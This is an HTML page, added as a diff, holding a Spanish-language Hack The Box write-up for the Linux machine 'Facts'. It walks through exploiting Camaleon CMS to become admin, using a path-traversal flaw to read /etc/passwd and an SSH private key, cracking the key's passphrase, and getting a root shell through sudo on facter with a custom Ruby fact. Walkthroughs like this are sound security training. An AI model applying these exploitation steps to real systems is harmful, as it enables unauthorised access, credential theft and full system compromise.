@@ -1,0 +1,144 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>RuyzTz7 | Facts HTB</title>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell writeup-detail-shell">
+      <a class="back-link" href="/writeups/linux.html">~/writeups/linux</a>
+
+      <section class="writeup-detail-hero">
+        <img src="/writeups/assets/facts/pasted-20260305232936.png" alt="Facts HTB" />
+        <div>
+          <p class="eyebrow">HTB / machines / Linux</p>
+          <h1>Facts</h1>
+          <div class="tag-list" aria-label="Tags">
+            <span>cms</span>
+            <span>camaleon</span>
+            <span>facter</span>
+            <span>ssh</span>
+          </div>
+        </div>
+      </section>
+
+      <article class="writeup-article">
+        <section class="writeup-section">
+          <h2>Índice</h2>
+          <ul>
+            <li><code>Enumeración</code>: CMS Camaleon 2.9.0 expuesto</li>
+            <li><code>Explotación</code>: Escalada dentro del CMS desde usuario registrado hasta administrador</li>
+            <li><code>Explotación</code>: LFI para enumerar usuarios y leer claves SSH</li>
+            <li><code>Escalada de Privilegios</code>: Sudoers sobre <code>facter</code></li>
+          </ul>
+        </section>
+        <section class="writeup-section">
+          <h2>Enumeración</h2>
+          <div class="code-card">
+            <h3>Fuzzing web</h3>
+            <pre><code>gobuster dir -u http://facts.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 30
+# Panel Login: http://facts.htb/admin/login</code></pre>
+          </div>
+        </section>
+        <section class="writeup-section">
+          <h2>Explotación: Escalada de Privilegios en la Web</h2>
+          <div class="code-card">
+            <h3>Crear Cuenta</h3>
+            <pre><code># Credenciales -&gt; alvaro:alvaro123</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/facts/pasted-20260305214721.png" alt="Facts HTB" />
+          <p><a href="https://github.com/predyy/CVE-2025-2304">PoC de GitHub</a></p>
+          <div class="code-card">
+            <h3>Convertir la cuenta alvaro en Admin</h3>
+            <pre><code>python exploit.py http://facts.htb alvaro alvaro123
+# Nos volvemos a loguear a la web y somos Admin</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/facts/pasted-20260305215212.png" alt="Facts HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Explotación: LFI</h2>
+          <p><a href="https://github.com/Goultarde/CVE-2024-46987/blob/main/CVE-2024-46987.py">PoC de GitHub</a></p>
+          <div class="code-card">
+            <h3>Ruta vulnerable a LFI</h3>
+            <pre><code># http://facts.htb/admin/media/download_private_file?file=../../../home/william/user.txt
+python3 poc.py -u http://facts.htb -l alvaro -p alvaro123 /etc/passwd </code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/facts/pasted-20260305214135.png" alt="Facts HTB" />
+          <div class="code-card">
+            <h3>Enumerar rutas sensibles</h3>
+            <pre><code>python3 poc.py -u http://facts.htb/ -l alvaro -p alvaro123 /home/trivia/.ssh/authorized_keys
+
+python3 poc.py -u http://facts.htb/ -l alvaro -p alvaro123 /home/trivia/.ssh/id_ed25519 &gt; id_ed25519
+# Encontramos id_ed25519 similar a id_rsa</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/facts/pasted-20260305215542.png" alt="Facts HTB" />
+          <div class="code-card">
+            <h3>Intentamos conectarnos sin proporcionar contraseña por SSH</h3>
+            <pre><code>chmod 600 id_ed25519
+ssh -i id_ed25519 trivia@facts.htb
+# Clave encriptada: Averiguar la contraseña de id_ed25519</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Pasar id_ed25519 a hash</h3>
+            <pre><code>ssh2john id_ed25519</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/facts/pasted-20260305231636.png" alt="Facts HTB" />
+          <div class="code-card">
+            <h3>Crackear hash</h3>
+            <pre><code>john --wordlist=/usr/share/wordlists/rockyou.txt hash</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/facts/pasted-20260305232150.png" alt="Facts HTB" />
+          <div class="code-card">
+            <h3>Acceso SSH</h3>
+            <pre><code>ssh -i id_ed25519 trivia@facts.htb
+# Contraseña id_ed25519: dragonballz</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/facts/pasted-20260305232059.png" alt="Facts HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Escalada de Privilegios: Sudoers (facter)</h2>
+          <div class="code-card">
+            <h3>Enumerar sudoers</h3>
+            <pre><code>sudo -l</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Crear exploit.sh</h3>
+            <pre><code>#!/bin/bash
+mkdir /tmp/custom
+cat &gt; /tmp/custom/shell.rb &lt;&lt; EOF
+Facter.add('shell') do
+  setcode do
+    exec('/bin/sh')
+  end
+end
+EOF</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/facts/pasted-20260306000144.png" alt="Facts HTB" />
+          <div class="code-card">
+            <h3>Ejecutar exploit y facter</h3>
+            <pre><code># Otorgar permiso de ejecución
+chmod +x exploit.sh
+# Ejecutar exploit
+./exploit.sh
+# Obtener consola como root
+sudo /usr/bin/facter --custom-dir=/tmp/custom</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/facts/pasted-20260306000347.png" alt="Facts HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Tags</h2>
+          <div class="tag-list">
+            <span>cms</span>
+            <span>camaleon</span>
+            <span>facter</span>
+            <span>ssh</span>
+            <span>id_ed25519</span>
+          </div>
+        </section>
+      </article>
+    </main>
+  </body>
+</html>
